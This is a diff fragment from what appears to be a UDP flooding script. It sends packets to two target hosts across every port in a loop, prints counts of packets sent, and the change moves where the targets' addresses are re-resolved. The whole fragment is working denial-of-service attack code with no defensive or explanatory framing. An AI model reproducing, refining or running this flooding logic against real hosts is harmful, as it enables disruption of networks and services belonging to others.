@@ -94,13 +94,14 @@ if port_mode == False:  # All ports.
                 print('\033[32;1m[%s]Sented %s packets to %s through port:1~%s\033[0m'%(dtime, sent, ip2, port))
                 print('\033[1;36m/wait %s'%(timeR))
                 port = 1
-                time.sleep(timeR)                               
+                time.sleep(timeR)
+                ip1 = socket.gethostbyname(url1)
+                ip2 = socket.gethostbyname(url2)
 
             elif port == 1900:
                 port = 1901
 
-            ip1 = socket.gethostbyname(url1)
-            ip2 = socket.gethostbyname(url2)
+            
             sock.sendto(bytes, (str(ip1), port))
             sock.sendto(bytes, (str(ip2), port))
             sent += 1
